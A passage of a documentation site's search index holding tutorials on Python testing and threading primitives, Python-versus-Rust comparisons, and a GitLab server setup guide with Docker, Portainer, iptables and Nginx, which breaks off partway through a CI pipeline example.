World!\"\n</code></pre>"},{"location":"python/testing/test/#7-network-conditions","title":"7. Network Conditions","text":""},{"location":"python/testing/test/#challenges_6","title":"Challenges:","text":"<ul> <li>Simulating latency, dropped packets, unreliable networks.</li> </ul>"},{"location":"python/testing/test/#example-testing-retries-with-mocking","title":"Example: Testing Retries with Mocking","text":"<p>Test retry logic by simulating intermittent failures:</p> <pre><code>from unittest.mock import Mock\n\ndef fetch_data_with_retry(fetch_func, retries=3):\n    for _ in range(retries):\n        try:\n            return fetch_func()\n        except TimeoutError:\n            continue\n    raise TimeoutError(\"All retries failed\")\n\ndef test_fetch_data_with_retry():\n    mock_func = Mock(side_effect=[TimeoutError, TimeoutError, \"Success\"])\n    assert fetch_data_with_retry(mock_func) == \"Success\"\n</code></pre>"},{"location":"python/testing/test/#8-configuration-variations","title":"8. Configuration Variations","text":""},{"location":"python/testing/test/#challenges_7","title":"Challenges:","text":"<ul> <li>Testing across different environments and OS setups.</li> </ul>"},{"location":"python/testing/test/#example-parameterized-testing-with-pytestmarkparametrize","title":"Example: Parameterized Testing with <code>pytest.mark.parametrize</code>","text":"<p>Simulate different OS behaviors:</p> <pre><code>import platform\nimport pytest\n\n@pytest.mark.parametrize(\"os_name\", [\"Linux\", \"Windows\", \"Darwin\"])\ndef test_os_behavior(os_name):\n    def mock_system():\n        return os_name\n\n    original_system = platform.system\n    platform.system = mock_system  # Temporarily override\n    try:\n        assert platform.system() == os_name\n    finally:\n        platform.system = original_system  # Restore original\n</code></pre>"},{"location":"python/testing/test/#9-data-consistency-in-distributed-systems","title":"9. Data Consistency in Distributed Systems","text":""},{"location":"python/testing/test/#challenges_8","title":"Challenges:","text":"<ul> <li>Simulating partial failures.</li> <li>Ensuring eventual consistency.</li> </ul>"},{"location":"python/testing/test/#example-simulating-network-partitions","title":"Example: Simulating Network Partitions","text":"<p>Use mock databases to simulate consistency checks:</p> <pre><code>class MockDatabase:\n    def __init__(self):\n        self.data = {}\n\n    def write(self, key, value):\n        self.data[key] = value\n\n    def read(self, key):\n        return self.data.get(key)\n\ndef test_eventual_consistency():\n    db1 = MockDatabase()\n    db2 = MockDatabase()\n\n    db1.write(\"key\", \"value\")\n    # Simulate network delay or failure\n    db2.write(\"key\", \"value\")\n\n    assert db1.read(\"key\") == db2.read(\"key\")\n</code></pre>"},{"location":"python/testing/test/#10-legacy-code","title":"10. Legacy Code","text":""},{"location":"python/testing/test/#challenges_9","title":"Challenges:","text":"<ul> <li>Poor documentation, tightly coupled dependencies.</li> </ul>"},{"location":"python/testing/test/#example-refactoring-for-dependency-injection","title":"Example: Refactoring for Dependency Injection","text":"<p>Inject dependencies to improve testability:</p> <pre><code>def legacy_function(data_source):\n    return sum(data_source.get_numbers()) + 10\n\nclass MockDataSource:\n    def get_numbers(self):\n        return [1, 2, 3]\n\ndef test_legacy_function():\n    mock_source = MockDataSource()\n    assert legacy_function(mock_source) == 16\n</code></pre>"},{"location":"python/testing/test/#additional-testing-techniques","title":"Additional Testing Techniques","text":""},{"location":"python/testing/test/#fixtures-for-setupteardown","title":"Fixtures for Setup/Teardown","text":"<p>Reuse setup code with pytest fixtures:</p> <pre><code>import pytest\n\n@pytest.fixture\ndef sample_data():\n    return [1, 2, 3]\n\ndef test_sum(sample_data):\n    assert sum(sample_data) == 6\n</code></pre>"},{"location":"python/testing/test/#test-coverage","title":"Test Coverage","text":"<p>Use <code>coverage.py</code> to measure and improve test coverage.</p>"},{"location":"python/testing/test/#parameterized-tests","title":"Parameterized Tests","text":"<p>Cover multiple scenarios with <code>pytest.mark.parametrize</code>.</p>"},{"location":"python/testing/test/#fault-injection","title":"Fault Injection","text":"<p>Simulate failures (e.g., database errors, network latency) to test resilience.</p>"},{"location":"python/testing/test/#mocking-with-context-managers","title":"Mocking with Context Managers","text":"<p>Simplify external dependency mocking using context managers.</p>"},{"location":"python/threading/threading/","title":"Python <code>threading</code> Module Synchronization Primitives","text":"<p>The <code>threading</code> module in Python provides several synchronization primitives that help coordinate and manage access to shared resources among multiple threads. Here\u2019s an overview of the key primitives available.</p>"},{"location":"python/threading/threading/#1-lock","title":"1. Lock","text":"<p>A <code>Lock</code> is the simplest synchronization primitive. It allows one thread at a time to access a resource, making it a useful tool for protecting shared data.</p> <pre><code>import threading\n\nlock = threading.Lock()\n\ndef critical_section():\n    with lock:\n        # Only one thread can access this section at a time\n        print(\"Accessing critical section\")\n</code></pre> <ul> <li>Usage: Ensures that only one thread can access a particular section of code at a time.</li> <li>Methods:</li> <li><code>acquire()</code>: Blocks the calling thread until the lock is acquired.</li> <li><code>release()</code>: Releases the lock so another thread can acquire it.</li> </ul>"},{"location":"python/threading/threading/#2-rlock-reentrant-lock","title":"2. RLock (Reentrant Lock)","text":"<p>An <code>RLock</code> (reentrant lock) allows a thread that has already acquired the lock to acquire it again without blocking. This is particularly useful in recursive functions or when a function calls other functions that also need the lock.</p> <pre><code>rlock = threading.RLock()\n\ndef recursive_function():\n    with rlock:\n        print(\"Lock acquired\")\n        # Recursive call or function that also needs the lock\n        if some_condition:\n            recursive_function()\n</code></pre> <ul> <li>Usage: Used when a thread needs to acquire the same lock multiple times in a nested or recursive function.</li> <li>Methods: Same as <code>Lock</code> (<code>acquire()</code> and <code>release()</code>), but a thread can re-acquire it without blocking.</li> </ul>"},{"location":"python/threading/threading/#3-semaphore","title":"3. Semaphore","text":"<p>A <code>Semaphore</code> allows a set number of threads to access a resource simultaneously. For example, if you want to limit access to a resource to three threads, you would use a semaphore initialized with a value of <code>3</code>.</p> <pre><code>semaphore = threading.Semaphore(3)  # Allows up to 3 threads\n\ndef limited_access():\n    with semaphore:\n        print(\"Accessing limited resource\")\n</code></pre> <ul> <li>Usage: To limit the number of threads accessing a resource.</li> <li>Methods:</li> <li><code>acquire()</code>: Decreases the semaphore count. If the count is zero, the calling thread blocks.</li> <li><code>release()</code>: Increases the semaphore count, allowing another thread to acquire it.</li> </ul>"},{"location":"python/threading/threading/#4-event","title":"4. Event","text":"<p>An <code>Event</code> allows one or more threads to wait until another thread signals an event. It is particularly useful for signaling between threads.</p> <pre><code>event = threading.Event()\n\ndef wait_for_event():\n    print(\"Waiting for event...\")\n    event.wait()\n    print(\"Event has been set\")\n\ndef set_event():\n    print(\"Setting event\")\n    event.set()\n</code></pre> <ul> <li>Usage: For signaling between threads. One thread can set the event, and all waiting threads are notified.</li> <li>Methods:</li> <li><code>set()</code>: Sets the event, releasing all waiting threads.</li> <li><code>clear()</code>: Clears the event.</li> <li><code>wait()</code>: Blocks until the event is set.</li> <li><code>is_set()</code>: Returns <code>True</code> if the event is set.</li> </ul>"},{"location":"python/threading/threading/#5-condition","title":"5. Condition","text":"<p>A <code>Condition</code> object is a more advanced version of <code>Event</code> that allows multiple threads to wait until notified. It can be combined with a <code>Lock</code> or <code>RLock</code> to create more complex synchronization patterns, such as producer-consumer scenarios.</p> <pre><code>condition = threading.Condition()\n\ndef consumer():\n    with condition:\n        print(\"Consumer waiting\")\n        condition.wait()  # Wait for a signal from producer\n        print(\"Consumer notified and proceeding\")\n\ndef producer():\n    with condition:\n        print(\"Producer notifying\")\n        condition.notify()  # Notify one waiting thread\n</code></pre> <ul> <li>Usage: Allows threads to wait for some condition and be notified when it changes.</li> <li>Methods:</li> <li><code>wait()</code>: Waits until notified.</li> <li><code>notify()</code>: Wakes up one waiting thread.</li> <li><code>notify_all()</code>: Wakes up all waiting threads.</li> </ul>"},{"location":"python/threading/threading/#6-barrier","title":"6. Barrier","text":"<p>A <code>Barrier</code> is used to synchronize a fixed number of threads at a specific point. When each thread reaches the barrier, they all wait until the specified number of threads have arrived, then they all proceed.</p> <pre><code>barrier = threading.Barrier(3)\n\ndef task():\n    print(\"Thread waiting at barrier\")\n    barrier.wait()  # Wait until all threads reach this point\n    print(\"Thread proceeding\")\n\n# Create 3 threads for the barrier\nthreads = [threading.Thread(target=task) for _ in range(3)]\nfor t in threads:\n    t.start()\n</code></pre> <ul> <li>Usage: For scenarios where a group of threads must synchronize and proceed together.</li> <li>Methods:</li> <li><code>wait()</code>: Blocks the thread until the specified number of threads have called it.</li> </ul>"},{"location":"python/threading/threading/#summary-of-usage","title":"Summary of Usage","text":"<ul> <li><code>Lock</code> and <code>RLock</code>: Used for mutual exclusion to prevent data races.</li> <li><code>Semaphore</code>: Controls access to a shared resource for a fixed number of threads.</li> <li><code>Event</code>: Signals state changes across threads.</li> <li><code>Condition</code>: Allows more complex waiting patterns, used for coordinated waiting and signaling.</li> <li><code>Barrier</code>: Ensures that threads reach a certain point before any can proceed.</li> </ul> <p>These primitives offer various ways to handle synchronization challenges in multi-threaded programs, letting you coordinate and manage shared resources effectively.</p>"},{"location":"rust/generators/","title":"Generators","text":""},{"location":"rust/generators/#generators-and-iterators","title":"Generators and Iterators","text":""},{"location":"rust/generators/#python","title":"Python","text":"<ul> <li>Generators: Use <code>yield</code> for lazy evaluation.</li> <li>Iterators: Objects that implement <code>__iter__</code> and <code>__next__</code>.</li> </ul> <pre><code>def count_up_to(max):\n    count = 1\n    while count &lt;= max:\n        yield count\n        count += 1\n\ngen = count_up_to(5)\nfor i in gen:\n    print(i)\n</code></pre>"},{"location":"rust/generators/#rust","title":"Rust","text":"<ul> <li>Iterators: Core part of Rust, implemented via the <code>Iterator</code> trait.</li> <li>No direct equivalent to <code>yield</code>: But can achieve similar functionality with iterator adaptors or by implementing <code>Iterator</code> trait.</li> </ul> <pre><code>struct CountUpTo {\n    count: u32,\n    max: u32,\n}\n\nimpl Iterator for CountUpTo {\n    type Item = u32;\n\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {\n        if self.count &lt;= self.max {\n            let ret = self.count;\n            self.count += 1;\n            Some(ret)\n        } else {\n            None\n        }\n    }\n}\n\nlet counter = CountUpTo { count: 1, max: 5 };\nfor i in counter {\n    println!(\"{}\", i);\n}\n</code></pre>"},{"location":"rust/generators/#context-managers","title":"Context Managers","text":""},{"location":"rust/generators/#python_1","title":"Python","text":"<ul> <li>Context Managers: Use <code>with</code> statement to automatically manage resources.</li> </ul> <pre><code>with open('file.txt', 'r') as f:\n    file_contents = f.read()\n</code></pre>"},{"location":"rust/generators/#rust_1","title":"Rust","text":"<ul> <li>RAII (Resource Acquisition Is Initialization): Resources are released when the variable goes out of scope, similar to context managers. Uses the <code>Drop</code> trait.</li> </ul> <pre><code>{\n    let f = File::open(\"file.txt\").expect(\"Unable to open file\");\n    // Use file\n} // `f` goes out of scope and is automatically closed here\n</code></pre>"},{"location":"rust/generators/#asynchronous-programming","title":"Asynchronous Programming","text":""},{"location":"rust/generators/#python_2","title":"Python","text":"<ul> <li>Async/Await: Python 3.5+ supports <code>async</code> and <code>await</code> for asynchronous programming.</li> </ul> <pre><code>import asyncio\n\nasync def fetch_data():\n    await asyncio.sleep(2)\n    return {'data': 1}\n\nasync def main():\n    result = await fetch_data()\n    print(result)\n\nasyncio.run(main())\n</code></pre>"},{"location":"rust/generators/#rust_2","title":"Rust","text":"<ul> <li>Async/Await: Rust also supports <code>async</code> and <code>await</code>, often used with <code>tokio</code> or <code>async-std</code>.</li> </ul> <pre><code>use tokio;\n\n#[tokio::main]\nasync fn main() {\n    let data = fetch_data().await;\n    println!(\"{:?}\", data);\n}\n\nasync fn fetch_data() -&gt; Result&lt;u32, &amp;'static str&gt; {\n    // Simulate an async operation\n    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;\n    Ok(1)\n}\n</code></pre>"},{"location":"rust/generators/#concurrency","title":"Concurrency","text":""},{"location":"rust/generators/#python_3","title":"Python","text":"<ul> <li>Threading and Multiprocessing: Due to GIL, multiprocessing is often used for CPU-bound tasks.</li> </ul> <pre><code>from multiprocessing import Process\n\ndef process_data(data):\n    # Process data\n    pass\n\nif __name__ == \"__main__\":\n    p = Process(target=process_data, args=(data,))\n    p.start()\n    p.join()\n</code></pre>"},{"location":"rust/generators/#rust_3","title":"Rust","text":"<ul> <li>Concurrency: Rust's ownership and type system allow for safe concurrency without a GIL. Uses <code>std::thread</code>, <code>tokio</code> for async operations.</li> </ul> <pre><code>use std::thread;\n\nfn process_data(data: &amp;str) {\n    // Process data\n}\n\nfn main() {\n    let data = \"data\";\n    let handle = thread::spawn(move || {\n        process_data(data);\n    });\n\n    handle.join().unwrap();\n}\n</code></pre> <p>Continuing with advanced examples, each section showcases the unique aspects and best practices of Python and Rust in handling complex programming scenarios.</p>"},{"location":"rust/memory/","title":"Memory","text":""},{"location":"rust/memory/#memory-management","title":"Memory Management","text":""},{"location":"rust/memory/#python","title":"Python","text":"<ul> <li>Garbage Collection: Python uses reference counting and a garbage collector to manage memory automatically. Developers have limited control over this process.</li> </ul> <pre><code>import gc\n\n# Create objects and circular references\nclass Circular:\n    def __init__(self):\n        self.loop = self\n\n# Force a garbage collection\ngc.collect()\n</code></pre>"},{"location":"rust/memory/#rust","title":"Rust","text":"<ul> <li>Ownership System: Rust uses a compile-time ownership system with rules that the compiler checks to manage memory safely and efficiently, eliminating the need for a garbage collector.</li> </ul> <pre><code>fn take_ownership(s: String) {\n    println!(\"{}\", s);\n} // `s` is dropped here\n\nlet my_string = String::from(\"hello\");\ntake_ownership(my_string);\n// `my_string` can no longer be used here as ownership was moved to the function\n</code></pre>"},{"location":"rust/memory/#type-system-and-generics","title":"Type System and Generics","text":""},{"location":"rust/memory/#python_1","title":"Python","text":"<ul> <li>Dynamic Typing: Python's type system is dynamic; type errors are only caught at runtime. Python 3.5+ introduced type hints for static analysis tools.</li> </ul> <pre><code>def add_numbers(a: int, b: int) -&gt; int:\n    return a + b\n\n# Type hints are not enforced at runtime\nresult = add_numbers(\"1\", \"2\")  # This is a runtime error, not caught by Python itself.\n</code></pre>"},{"location":"rust/memory/#rust_1","title":"Rust","text":"<ul> <li>Static Typing with Generics: Rust's type system is static, enforcing types at compile time. Generics allow for type-safe code without sacrificing performance.</li> </ul> <pre><code>fn add_numbers&lt;T: std::ops::Add&lt;Output = T&gt;&gt;(a: T, b: T) -&gt; T {\n    a + b\n}\n\nlet int_result = add_numbers(1, 2); // Works\nlet float_result = add_numbers(1.0, 2.0); // Works\n// Rust compiler enforces type safety, errors are caught at compile time.\n</code></pre>"},{"location":"rust/memory/#pattern-matching","title":"Pattern Matching","text":""},{"location":"rust/memory/#python_2","title":"Python","text":"<ul> <li>Limited to simple matching cases using if-elif-else structures. Python 3.10 introduced match-case, similar to Rust's match, but it's less integrated into the language's core features.</li> </ul> <pre><code># Using Python 3.10+ match-case\nmatch x:\n    case 0:\n        print(\"Zero\")\n    case 1:\n        print(\"One\")\n    case _:\n        print(\"Something else\")\n</code></pre>"},{"location":"rust/memory/#rust_2","title":"Rust","text":"<ul> <li>First-Class Feature: Pattern matching in Rust is powerful and deeply integrated, allowing matching against values, structs, enums, and more.</li> </ul> <pre><code>enum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n}\n\nfn process_message(message: Message) {\n    match message {\n        Message::Quit =&gt; println!(\"Quit\"),\n        Message::Move { x, y } =&gt; println!(\"Move to x: {}, y: {}\", x, y),\n        Message::Write(text) =&gt; println!(\"Text message: {}\", text),\n    }\n}\n</code></pre>"},{"location":"rust/memory/#macros","title":"Macros","text":""},{"location":"rust/memory/#python_3","title":"Python","text":"<ul> <li>Macros are not natively supported: Python does not have a macro system. Metaprogramming in Python is typically done using decorators or other runtime features.</li> </ul>"},{"location":"rust/memory/#rust_3","title":"Rust","text":"<ul> <li>Powerful Macro System: Rust macros allow for writing code that writes other code, which is especially useful for reducing boilerplate and ensuring compile-time code generation.</li> </ul> <pre><code>macro_rules! say_hello {\n    () =&gt; {\n        println!(\"Hello, Rust!\");\n    };\n}\n\nsay_hello!(); // This will print \"Hello, Rust!\" at runtime.\n</code></pre>"},{"location":"rust/memory/#conclusion","title":"Conclusion","text":"<p>This detailed comparison underscores the distinctive approaches of Python and Rust in handling advanced programming concepts. While Python offers simplicity and dynamic features conducive to rapid development, Rust provides a robust system for safe and efficient coding, leveraging its ownership model, type system, and concurrency features. Understanding these differences and their implications can significantly enhance a developer's ability to utilize the strengths of each language effectively.</p>"},{"location":"rust/object/","title":"Objects","text":""},{"location":"rust/object/#generators-and-iterators","title":"Generators and Iterators","text":""},{"location":"rust/object/#python","title":"Python","text":"<ul> <li>Generators: Use <code>yield</code> for lazy evaluation.</li> <li>Iterators: Objects that implement <code>__iter__</code> and <code>__next__</code>.</li> </ul> <pre><code>def count_up_to(max):\n    count = 1\n    while count &lt;= max:\n        yield count\n        count += 1\n\ngen = count_up_to(5)\nfor i in gen:\n    print(i)\n</code></pre>"},{"location":"rust/object/#rust","title":"Rust","text":"<ul> <li>Iterators: Core part of Rust, implemented via the <code>Iterator</code> trait.</li> <li>No direct equivalent to <code>yield</code>: But can achieve similar functionality with iterator adaptors or by implementing <code>Iterator</code> trait.</li> </ul> <pre><code>struct CountUpTo {\n    count: u32,\n    max: u32,\n}\n\nimpl Iterator for CountUpTo {\n    type Item = u32;\n\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; {\n        if self.count &lt;= self.max {\n            let ret = self.count;\n            self.count += 1;\n            Some(ret)\n        } else {\n            None\n        }\n    }\n}\n\nlet counter = CountUpTo { count: 1, max: 5 };\nfor i in counter {\n    println!(\"{}\", i);\n}\n</code></pre>"},{"location":"rust/object/#context-managers","title":"Context Managers","text":""},{"location":"rust/object/#python_1","title":"Python","text":"<ul> <li>Context Managers: Use <code>with</code> statement to automatically manage resources.</li> </ul> <pre><code>with open('file.txt', 'r') as f:\n    file_contents = f.read()\n</code></pre>"},{"location":"rust/object/#rust_1","title":"Rust","text":"<ul> <li>RAII (Resource Acquisition Is Initialization): Resources are released when the variable goes out of scope, similar to context managers. Uses the <code>Drop</code> trait.</li> </ul> <pre><code>{\n    let f = File::open(\"file.txt\").expect(\"Unable to open file\");\n    // Use file\n} // `f` goes out of scope and is automatically closed here\n</code></pre>"},{"location":"rust/object/#asynchronous-programming","title":"Asynchronous Programming","text":""},{"location":"rust/object/#python_2","title":"Python","text":"<ul> <li>Async/Await: Python 3.5+ supports <code>async</code> and <code>await</code> for asynchronous programming.</li> </ul> <pre><code>import asyncio\n\nasync def fetch_data():\n    await asyncio.sleep(2)\n    return {'data': 1}\n\nasync def main():\n    result = await fetch_data()\n    print(result)\n\nasyncio.run(main())\n</code></pre>"},{"location":"rust/object/#rust_2","title":"Rust","text":"<ul> <li>Async/Await: Rust also supports <code>async</code> and <code>await</code>, often used with <code>tokio</code> or <code>async-std</code>.</li> </ul> <pre><code>use tokio;\n\n#[tokio::main]\nasync fn main() {\n    let data = fetch_data().await;\n    println!(\"{:?}\", data);\n}\n\nasync fn fetch_data() -&gt; Result&lt;u32, &amp;'static str&gt; {\n    // Simulate an async operation\n    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;\n    Ok(1)\n}\n</code></pre>"},{"location":"rust/object/#concurrency","title":"Concurrency","text":""},{"location":"rust/object/#python_3","title":"Python","text":"<ul> <li>Threading and Multiprocessing: Due to GIL, multiprocessing is often used for CPU-bound tasks.</li> </ul> <pre><code>from multiprocessing import Process\n\ndef process_data(data):\n    # Process data\n    pass\n\nif __name__ == \"__main__\":\n    p = Process(target=process_data, args=(data,))\n    p.start()\n    p.join()\n</code></pre>"},{"location":"rust/object/#rust_3","title":"Rust","text":"<ul> <li>Concurrency: Rust's ownership and type system allow for safe concurrency without a GIL. Uses <code>std::thread</code>, <code>tokio</code> for async operations.</li> </ul> <pre><code>use std::thread;\n\nfn process_data(data: &amp;str) {\n    // Process data\n}\n\nfn main() {\n    let data = \"data\";\n    let handle = thread::spawn(move || {\n        process_data(data);\n    });\n\n    handle.join().unwrap();\n}\n</code></pre> <p>Continuing with advanced examples, each section showcases the unique aspects and best practices of Python and Rust in handling complex programming scenarios.</p>"},{"location":"rust/vars/","title":"Rust for Python Developers: A Comparative Guide with Advanced Examples","text":""},{"location":"rust/vars/#variables-and-data-types","title":"Variables and Data Types","text":""},{"location":"rust/vars/#python","title":"Python","text":"<ul> <li>Dynamic Typing: Variables can change types.</li> <li>Types: <code>int</code>, <code>float</code>, <code>str</code>, <code>bool</code>, complex, <code>NoneType</code>.</li> <li>Collections: <code>list</code>, <code>tuple</code>, <code>dict</code>, <code>set</code>.</li> </ul> <pre><code>x = 100  # Integer\nx = \"Hello, World!\"  # Now a string\ndata = {'key': 'value', 'number': 42}\n</code></pre>"},{"location":"rust/vars/#rust","title":"Rust","text":"<ul> <li>Static Typing: Variable types are known at compile time.</li> <li>Scalar Types: <code>i32</code>, <code>f64</code>, <code>bool</code>, <code>char</code>.</li> <li>Compound Types: Tuples, Arrays.</li> <li>Mutability: Variables are immutable by default. Use <code>mut</code> for mutability.</li> <li>Ownership and Borrowing: Core features for memory safety.</li> </ul> <pre><code>let x: i32 = 100;\nlet mut y = \"Hello\"; // mutable\ny = \"World!\";\nlet data: HashMap&lt;&amp;str, i32&gt; = [(\"key\", 42)].iter().cloned().collect();\n</code></pre>"},{"location":"rust/vars/#control-flow","title":"Control Flow","text":""},{"location":"rust/vars/#python_1","title":"Python","text":"<ul> <li>Loops: <code>for</code>, <code>while</code>.</li> <li>Conditional Statements: <code>if</code>, <code>elif</code>, <code>else</code>.</li> </ul> <pre><code>for i in range(5):\n    print(i)\n\nif x &gt; 0:\n    print(\"Positive\")\nelif x == 0:\n    print(\"Zero\")\nelse:\n    print(\"Negative\")\n</code></pre>"},{"location":"rust/vars/#rust_1","title":"Rust","text":"<ul> <li>Loops: <code>loop</code>, <code>while</code>, <code>for</code>.</li> <li>Conditional Statements: <code>if</code>, <code>else</code>, <code>match</code> for pattern matching.</li> </ul> <pre><code>for i in 0..5 {\n    println!(\"{}\", i);\n}\n\nmatch x {\n    0 =&gt; println!(\"Zero\"),\n    _ if x &gt; 0 =&gt; println!(\"Positive\"),\n    _ =&gt; println!(\"Negative\"),\n}\n</code></pre>"},{"location":"rust/vars/#functions-and-methods","title":"Functions and Methods","text":""},{"location":"rust/vars/#python_2","title":"Python","text":"<ul> <li>Defining Functions: Use <code>def</code>.</li> <li>Parameters &amp; Return Types: Dynamically typed.</li> <li>First-Class Objects: Functions can be passed around.</li> </ul> <pre><code>def add(a, b):\n    return a + b\n\nclass MyClass:\n    def method(self):\n        print(\"Method called\")\n</code></pre>"},{"location":"rust/vars/#rust_2","title":"Rust","text":"<ul> <li>Defining Functions: Use <code>fn</code>, specify types.</li> <li>Parameters &amp; Return Types: Statically typed.</li> <li>First-Class Objects: Functions can be variables or arguments.</li> </ul> <pre><code>fn add(a: i32, b: i32) -&gt; i32 {\n    a + b\n}\n\nstruct MyClass;\n\nimpl MyClass {\n    fn method(&amp;self) {\n        println!(\"Method called\");\n    }\n}\n</code></pre>"},{"location":"rust/vars/#error-handling","title":"Error Handling","text":""},{"location":"rust/vars/#python_3","title":"Python","text":"<ul> <li>Exceptions: Use <code>try</code>, <code>except</code>, <code>finally</code>.</li> </ul> <pre><code>try:\n    result = risky_operation()\nexcept Exception as e:\n    print(f\"Error: {e}\")\nfinally:\n    clean_up()\n</code></pre>"},{"location":"rust/vars/#rust_3","title":"Rust","text":"<ul> <li>Result and Option: No exceptions, use <code>Result&lt;T, E&gt;</code>, <code>Option&lt;T&gt;</code> for error handling.</li> </ul> <pre><code>fn risky_operation() -&gt; Result&lt;i32, &amp;'static str&gt; {\n    if success {\n        Ok(42)\n    } else {\n        Err(\"Failed\")\n    }\n}\n\nmatch risky_operation() {\n    Ok(n) =&gt; println!(\"Success: {}\", n),\n    Err(e) =&gt; println!(\"Error: {}\", e),\n}\n</code></pre>"},{"location":"rust/vars/#collections","title":"Collections","text":""},{"location":"rust/vars/#python_4","title":"Python","text":"<ul> <li>Lists, dictionaries, and sets with dynamic typing and various methods.</li> </ul> <pre><code>my_list = [1, 2, 3]\nmy_dict = {\"key\": \"value\"}\nmy_set = {1, 2, 3}\n</code></pre>"},{"location":"rust/vars/#rust_4","title":"Rust","text":"<ul> <li>Vectors, hash maps, and sets with static typing and safety.</li> </ul> <pre><code>let my_vec = vec![1, 2, 3];\nlet mut my_map: HashMap&lt;&amp;str, &amp;str&gt; = HashMap::new();\nmy_map.insert(\"key\", \"value\");\nlet my_set: HashSet&lt;i32&gt; = [1, 2, 3].iter().cloned().collect();\n</code></pre> <p>This structure outlines a comprehensive, example-driven comparison between Python and Rust, focusing on advanced aspects of each topic. Proceed by fleshing out each section with detailed examples and explanations.</p>"},{"location":"setups/install/","title":"GitLab Server Installation and Configuration","text":"<p>Follow these steps to install and configure a GitLab server:</p> <ol> <li> <p>Install Debian server.</p> </li> <li> <p>Install Docker CE: <pre><code>apt install docker.io\nsystemctl start docker\n</code></pre></p> </li> <li> <p>Install Portainer CE. Ports 9000 is for HTTP and 9443 is for HTTPS: <pre><code>docker run -d -p 8000:8000 -p 9000:9000 -p 9443:9443 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:latest\n</code></pre></p> </li> <li> <p>Open ports: <pre><code>iptables -t nat -A PREROUTING -i vmbr0 -p tcp --dport 9980 -j DNAT --to 192.168.1.7:9000\niptables -t nat -A PREROUTING -i vmbr0 -p tcp --dport 9981 -j DNAT --to 192.168.1.7:9443\n</code></pre></p> </li> <li> <p>Install GitLab CE in Docker with Portainer. Create a <code>docker-compose.yml</code> file with the following content:</p> </li> </ol> <pre><code>version: '3.8'\n\nservices:\n gitlab:\n   image: 'gitlab/gitlab-ce:latest'\n   restart: 'unless-stopped'\n   hostname: 'gitlab.gitlab'\n   environment:\n     GITLAB_OMNIBUS_CONFIG: |\n       external_url 'https://gitlab.example.com'\n       gitlab_rails['gitlab_ssh_host'] = 'example.com'\n       gitlab_rails['gitlab_shell_ssh_port'] = 9982\n       gitlab_rails['gitlab_port'] = 9983\n       nginx['listen_port'] = 9983\n       nginx['listen_https'] = false\n       gitlab_rails['registry_enabled'] = true\n   ports:\n     - '9983:9983'\n     - '9982:22'\n   volumes:\n     - 'gitlab_config:/etc/gitlab'\n     - 'gitlab_logs:/var/log/gitlab'\n     - 'gitlab_data:/var/opt/gitlab'\n   shm_size: '1gb'\n   networks:\n     default:\n       aliases:\n         - 'gitlab.gitlab'\n\n gitlab-runner:\n   image: 'gitlab/gitlab-runner:latest'\n   restart: 'unless-stopped'\n   container_name: 'gitlab-runner'\n   volumes:\n     - 'gitlab_runner_config:/etc/gitlab-runner'\n     - '/var/run/docker.sock:/var/run/docker.sock'\n   extra_hosts:\n     - \"gitlab.examle.com:192.168.1.5\"\n   networks:\n     - 'default'\n\nnetworks:\n default:\n   driver: 'bridge'\n\nvolumes:\n gitlab_config:\n gitlab_logs:\n gitlab_data:\n Gitlab_runner_config:\n</code></pre> <p>Replace <code>external_url</code> with your Git repository clone HTTPS address, and <code>gitlab_ssh_host</code> and <code>gitlab_shell_ssh_port</code> with your Clone with SSH address.</p> <p>Make sure the IP in <code>extra_hosts</code> for <code>gitlab_runner</code> matches the GitLab server's IP since they are on the same server.</p> <ol> <li> <p>Open ports from the outside: <pre><code>iptables -t nat -A PREROUTING -i vmbr0 -p tcp --dport 9982 -j DNAT --to 192.168.1.7:9982\n</code></pre></p> </li> <li> <p>Create an Nginx configuration file, <code>gitlab.conf</code>, with the following content:</p> </li> </ol> <pre><code>server {\n   listen 80;\n   listen [::]:80;\n   server_name www.example.com\n   server_name www.example.com\n\n   location / {\n       return 301 https://$server_name$request_uri;\n   }\n}\n\nserver {\n   listen 443 ssl http2;\n   listen [::]:443 ssl http2;\n   server_name example.com www.example.com;\n\n   ssl_certificate /etc/letsencrypt/live/www.examole.com/fullchain.pem;\n   ssl_certificate_key /etc/letsencrypt/live/www.example.com/privkey.pem;\n   include /etc/letsencrypt/options-ssl-nginx.conf;\n   ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n\n   location / {\n       proxy_pass http://192.168.1.7:9983;\n       proxy_set_header Host $host;\n       proxy_set_header X-Real-IP $remote_addr;\n       proxy_set_header X-Forwarded-Proto https;\n       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n       proxy_redirect off;\n   }\n}\n</code></pre> <p>Note: Let's Encrypt does not work on non-standard ports for GitLab server.</p> <ol> <li> <p>Generate the certificate: <pre><code>certbot --nginx -d www.example.com -d example.com\n</code></pre></p> </li> <li> <p>Create a symlink: <pre><code>ln -sf /etc/nginx/sites-available/gitlab.conf /etc/nginx/sites-enabled/gitlab\n</code></pre></p> </li> </ol> <p>Restart Nginx: <pre><code>systemctl restart nginx\n</code></pre></p> <ol> <li> <p>In GitLab, create a group, user, and repository. Go to the repository settings -&gt; CI/CD -&gt; Runners -&gt; Expand -&gt; Copy the registration token, which is required to register the runner.</p> </li> <li> <p>In Portainer, go to the runner terminal and register the runner:</p> </li> </ol> <pre><code>    gitlab-runner register --non-interactive --executor \"docker\" --docker-image docker:20.10.24-git --url \"https://gitlab.example.com/\" --registration-token \"TOKEN\" --description \"local-runner\" --docker-network-mode gitlab-ce_default --docker-privileged\n</code></pre> <pre><code>Ensure that the `docker-network-mode` value is the same as the network used in the `docker-compose.yml` file.\n</code></pre> <p>Here is a sample <code>.gitlab-ci.yml</code> pipeline configuration:</p> <pre><code>   image: docker:20.10.24-git\n   services:\n     - name: docker:20.10.24-dind\n       alias: docker\n\n   stages:\n     - build\n     - test\n\n   variables:\n     APP_NAME: my-app\n     DOCKER_HOST: tcp://docker:2375\n     DOCKER_DRIVER: overlay2\n     DOCKER_TLS_CERTDIR: \"\"\n     DOCKER_IMAGE_TAG: latest\n     DOCKER_REGISTRY_URL: gitlab.example.com\n     DOCKER_REGISTRY_USERNAME: root\n     DOCKER_REGISTRY_PASSWORD: \n\n   build:\n     stage: build\n     script:\n       - echo 